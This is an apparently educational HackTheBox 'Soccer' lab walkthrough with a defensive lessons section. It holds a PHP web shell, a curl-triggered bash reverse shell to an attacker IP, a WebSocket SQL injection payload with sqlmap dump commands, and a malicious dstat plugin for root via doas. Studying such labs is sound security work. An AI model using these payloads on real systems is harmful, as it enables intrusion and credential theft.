---
date: "2025-01-02T10:00:00+00:00"
lastmod: "2025-01-02T10:00:00+00:00"
draft: false
title: "HackTheBox: Soccer Walkthrough"
description: "Detailed walkthrough of HackTheBox Soccer machine (10.10.11.194) covering web exploitation, WebSocket SQL injection, and privilege escalation through doas misconfiguration."
summary: "Complete penetration testing walkthrough of HackTheBox Soccer machine featuring Tiny File Manager exploitation, WebSocket SQL injection, and doas privilege escalation with detailed explanations."
keywords: ["hackthebox soccer", "websocket sql injection", "tiny file manager", "doas privilege escalation", "web exploitation", "penetration testing walkthrough", "ethical hacking", "cybersecurity"]
tags: ["hackthebox", "linux", "penetration-testing", "web-exploitation", "sql-injection", "websockets", "privilege-escalation"]
categories: ["HackTheBox"]
author: "realspaceeagle"
image: "/images/htb-soccer/soccer-banner.png"
showToc: true
TocOpen: true
hidemeta: false
comments: true
disableHLJS: false
disableShare: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
---

## Machine Information

- **Machine Name:** Soccer
- **IP Address:** 10.10.11.194  
- **Operating System:** Linux (Ubuntu)
- **Difficulty:** Easy
- **Points:** 20

## Summary

Soccer is an Easy-rated Linux machine from HackTheBox that focuses on web exploitation and privilege escalation. The attack path involves discovering a Tiny File Manager installation with default credentials, uploading a PHP reverse shell, discovering a secondary web application through nginx configuration analysis, exploiting a WebSocket-based SQL injection vulnerability, and finally escalating privileges through a misconfigured doas binary.

## Reconnaissance

### Initial Setup

First, let's set up our environment and add the target to our hosts file:

```bash
# Connect to HTB VPN
cd /home/kali/Desktop/HTB-Linux && sudo openvpn lab_Dream4ip.ovpn

# Create working directory
mkdir soccer && cd soccer

# Add target to hosts file
sudo nano /etc/hosts
10.10.11.194   soccer.htb
```

### Port Scanning

Let's start with a comprehensive Nmap scan to identify open services:

```bash
# Initial TCP scan
sudo nmap -sC -sV -vv -oA nmap/soccer 10.10.11.194

# Full port scan
nmap -p- -v -oA allports 10.10.11.194

# UDP scan
sudo nmap -sU --min-rate 10000 10.10.11.194

# Targeted service scan
nmap -sV -sC -p 22,80,9091 10.10.11.194
```

### Nmap Results

```bash
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
```

Key findings:
- **Port 22:** SSH service (OpenSSH 8.2p1)
- **Port 80:** HTTP service (nginx 1.18.0) with redirect to soccer.htb
- **Port 9091:** Unknown service returning HTTP responses

## Web Application Analysis

### Directory Enumeration

Let's enumerate the web directories on port 80:

```bash
# Gobuster directory enumeration
gobuster dir -u http://soccer.htb -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -o root.gobuster

# Feroxbuster for recursive enumeration
feroxbuster -u http://soccer.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
```

### Tiny File Manager Discovery

During enumeration, we discover a `/tiny` directory containing Tiny File Manager 2.4.3. This is a web-based file management system that often ships with default credentials.

**Default Credentials Found:**
- Username: `admin`
- Password: `admin@123`

![Tiny File Manager Login](/images/htb-soccer/tiny-file-manager.png)

## Initial Access

### PHP Reverse Shell Upload

After logging into Tiny File Manager, we can upload files to the `/uploads` directory. Let's create a PHP reverse shell:

```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

Upload the shell as `shell.php` to the `/uploads` directory.

### Gaining Shell Access

Set up a netcat listener and execute our reverse shell:

```bash
# Set up listener
rlwrap nc -nlvp 9001

# Trigger reverse shell via browser or curl
curl -X POST "http://soccer.htb/tiny/uploads/shell.php" --data-urlencode "cmd=bash -c 'bash -i > /dev/tcp/10.10.14.13/9001 0>&1'"
```

### Shell Stabilization

Once we get the initial shell, let's stabilize it:

```bash
# Spawn TTY shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background the session
CTRL + Z

# Set raw mode and foreground
stty raw -echo; fg

# Export terminal type and resize
export TERM=xterm
stty rows 28 cols 110
```

## Privilege Escalation to Player User

### Nginx Configuration Analysis

Let's examine the nginx configuration to discover additional applications:

```bash
cat /etc/nginx/nginx.conf
ls -la /etc/nginx/sites-enabled/
```

We discover an additional virtual host configuration:

```bash
cat /etc/nginx/sites-enabled/soc-player.htb
```

```nginx
server {
    listen 80;
    listen [::]:80;

    server_name soc-player.soccer.htb;

    root /root/app/views;

    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }
}
```

This reveals a new subdomain: `soc-player.soccer.htb`

### Add New Host Entry

```bash
# Add to hosts file
sudo nano /etc/hosts
10.10.11.194   soccer.htb soc-player.soccer.htb
```

### WebSocket SQL Injection Discovery

Visiting `http://soc-player.soccer.htb/check` reveals a ticket checking functionality that uses WebSockets for communication. The JavaScript code shows:

```javascript
var ws = new WebSocket("ws://soc-player.soccer.htb:9091");

function sendText() {
    var msg = input.value;
    if (msg.length > 0) {
        ws.send(JSON.stringify({
            "id": msg
        }))
    }
}
```

### Testing for SQL Injection

Let's test if the WebSocket endpoint is vulnerable to SQL injection:

```bash
# Connect using wscat
wscat -c ws://soc-player.soccer.htb:9091/ws

# Test SQL injection payload
{"id":"92130 or 5=1-- -"}
```

The application responds differently to true/false conditions, indicating SQL injection vulnerability.

### Automated SQL Injection with SQLMap

```bash
# Use SQLMap with WebSocket support
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --batch --level 5 --risk 3 --threads 10

# Enumerate databases
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --dbs

# Dump soccer_db database
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' -D soccer_db --dump
```

### Database Extraction Results

```bash
Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
```

### SSH Access as Player

```bash
# SSH with discovered credentials
sshpass -p 'PlayerOftheMatch2022' ssh player@10.10.11.194

# Or manual SSH
ssh player@10.10.11.194
# Password: PlayerOftheMatch2022
```

## Privilege Escalation to Root

### System Enumeration

Let's enumerate the system for privilege escalation vectors:

```bash
# Check user permissions
id
groups

# Find SUID/SGID binaries
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Look for interesting files owned by player group
find / -group player 2>/dev/null | grep -v '^/proc\|^/run\|^/sys'
```

### Doas Configuration Discovery

We discover several interesting findings:

```bash
# SUID binary
-rwsr-xr-x 1 root root 42K Nov 17  2022 /usr/local/bin/doas

# Configuration file
cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat

# Writable directory
ls -la /usr/local/share/
drwxrwx--- 2 root player 4096 Dec 12 2022 dstat
```

Key findings:
- `doas` is configured to allow the `player` user to run `/usr/bin/dstat` as root without a password
- The `/usr/local/share/dstat` directory is writable by the `player` group
- `dstat` loads plugins from this directory

### Dstat Plugin Exploitation

The `dstat` utility loads plugins from `/usr/local/share/dstat`. Since we have write access to this directory, we can create a malicious plugin:

```bash
# Create malicious dstat plugin
echo 'import os; os.execv("/bin/sh", ["sh"])' > /usr/local/share/dstat/dstat_haran.py

# Execute dstat with our plugin as root
doas /usr/bin/dstat --haran
```

This will execute our Python code as root, giving us a root shell.

![Root Shell](/images/htb-soccer/root-shell.png)

## Post-Exploitation

### Flag Collection

```bash
# User flag
cat /home/player/user.txt

# Root flag  
cat /root/root.txt
```

### System Information

```bash
# System details
uname -a
cat /etc/os-release
whoami
id
```

## Attack Chain Summary

1. **Initial Reconnaissance:** Nmap scan revealed HTTP service and unusual service on port 9091
2. **Web Enumeration:** Directory enumeration discovered Tiny File Manager with default credentials
3. **Initial Access:** Uploaded PHP reverse shell through file manager
4. **Service Discovery:** Analyzed nginx configuration to discover additional virtual host
5. **WebSocket Exploitation:** Identified and exploited SQL injection in WebSocket endpoint
6. **Lateral Movement:** Retrieved database credentials and SSH'd as player user
7. **Privilege Escalation:** Exploited doas configuration allowing dstat execution with writable plugin directory
8. **Root Access:** Created malicious dstat plugin to gain root shell

## Lessons Learned

### Web Application Security Failures

1. **Default Credentials Are Still Dangerous**
   - Tiny File Manager shipped with admin:admin@123 credentials
   - Many applications still use predictable default passwords
   - Automated scanners specifically check for these common combinations
   - **Impact:** Immediate administrative access to file management system

2. **File Upload Vulnerabilities Enable System Compromise**
   - No file type validation or content inspection implemented
   - Upload directory accessible via web browser
   - PHP execution enabled in upload directories
   - **Impact:** Direct path from file upload to remote code execution

3. **WebSocket Security Often Overlooked**
   - WebSocket endpoints frequently lack the same security controls as HTTP
   - SQL injection in WebSocket parameters bypassed traditional WAF protection
   - Real-time communication channels introduce unique attack vectors
   - **Impact:** Database compromise through blind SQL injection

### Infrastructure Misconfigurations

4. **Service Discovery Through Configuration Files**
   - Nginx configuration files revealed additional virtual hosts
   - Internal service URLs exposed through proxy configurations
   - Development endpoints accidentally exposed in production
   - **Impact:** Attack surface expansion through service enumeration

5. **Privilege Escalation via Administrative Tools**
   - doas configuration allowed execution of extensible utilities
   - Plugin directories writable by restricted users
   - No validation of plugin content before execution
   - **Impact:** Direct privilege escalation to root through malicious plugins

### Database Security Weaknesses

6. **Blind SQL Injection in Modern Applications**
   - NoSQL and WebSocket applications often lack proper input sanitization
   - Time-based detection methods work even with minimal error responses
   - Automated tools like SQLMap adapt to non-traditional injection points
   - **Impact:** Complete database extraction including user credentials

### Authentication and Authorization Issues

7. **Credential Storage and Transmission**
   - Plain text passwords stored in database tables
   - Weak hashing algorithms (MD5) easily cracked
   - Password reuse across multiple services and accounts
   - **Impact:** Lateral movement through credential reuse

8. **Insufficient Access Controls**
   - System utilities granted excessive privileges through sudo/doas
   - No monitoring of administrative tool usage
   - Plugin systems lack security boundaries
   - **Impact:** Administrative bypass through legitimate tools

### Network Security Gaps

9. **Internal Service Exposure**
   - Services bound to internal interfaces assumed secure
   - Proxy configurations revealed backend architecture
   - Port forwarding and tunneling enabled external access
   - **Impact:** Internal service compromise from external attackers

### Defensive Recommendations

#### Immediate Security Controls

1. **Eliminate Default Credentials**
   - Force password changes during initial setup
   - Implement password complexity requirements
   - Use unique default credentials per installation
   - Regular audits for unchanged default passwords

2. **Implement Robust File Upload Security**
   - Whitelist allowed file extensions and MIME types
   - Store uploads outside web-accessible directories
   - Implement virus scanning and content validation
   - Use separate domains for user-uploaded content

3. **Secure WebSocket Communications**
   - Apply same input validation as HTTP endpoints
   - Implement authentication and authorization for WebSocket connections
   - Use parameterized queries for all database interactions
   - Monitor WebSocket traffic for suspicious patterns

#### Long-term Security Architecture

4. **Configuration Management Security**
   - Implement configuration file encryption for sensitive data
   - Use secret management systems for credentials
   - Separate development and production configurations
   - Regular configuration security reviews

5. **Privilege Management Controls**
   - Apply principle of least privilege to all administrative tools
   - Implement application whitelisting for plugin systems
   - Monitor and log all privilege escalation attempts
   - Use dedicated service accounts with minimal permissions

6. **Database Security Hardening**
   - Implement database activity monitoring
   - Use stored procedures and parameterized queries exclusively
   - Enable query logging and anomaly detection
   - Regular database security assessments

#### Monitoring and Detection

7. **Security Monitoring Implementation**
   - Deploy Web Application Firewalls (WAF) with WebSocket support
   - Implement real-time SQL injection detection
   - Monitor file upload activities and execution attempts
   - Log all authentication and authorization events

8. **Incident Response Preparation**
   - Develop playbooks for web application compromises
   - Implement automated containment for file upload attacks
   - Create forensic procedures for database breaches
   - Regular incident response drills and updates

### Attack Chain Analysis

This machine demonstrated a complete attack chain:

1. **Initial Access:** Default credentials → File upload → Remote code execution
2. **Service Discovery:** Configuration analysis → Additional attack surface
3. **Data Extraction:** WebSocket SQL injection → Credential harvesting
4. **Lateral Movement:** Password reuse → SSH access upgrade
5. **Privilege Escalation:** Administrative tool abuse → Root access

Each step could have been prevented with proper security controls, highlighting the importance of defense-in-depth strategies rather than relying on single security measures.

### Real-World Application

This attack pattern is commonly seen in production environments where:
- Legacy applications maintain default configurations
- Development features accidentally remain enabled in production
- Internal services assume network-level security is sufficient
- Administrative tools lack proper security boundaries

Organizations should prioritize security assessments of web applications, especially those handling file uploads or using WebSocket communications, as these represent high-value targets for attackers seeking initial access to corporate networks.

## Tools Used

- **Nmap:** Port scanning and service enumeration
- **Gobuster/Feroxbuster:** Directory enumeration  
- **SQLMap:** Automated SQL injection testing
- **wscat:** WebSocket client for manual testing
- **Netcat:** Reverse shell listener
- **SSH:** Remote access with discovered credentials

## References

- [HackTheBox Platform](https://www.hackthebox.eu/)
- [Tiny File Manager](https://tinyfilemanager.github.io/)
- [SQLMap Documentation](https://sqlmap.org/)
- [doas Manual](https://man.openbsd.org/doas)
- [GTFOBins - dstat](https://gtfobins.github.io/gtfobins/dstat/)

---

*This writeup is for educational purposes only. Always ensure you have proper authorization before testing security on any systems.*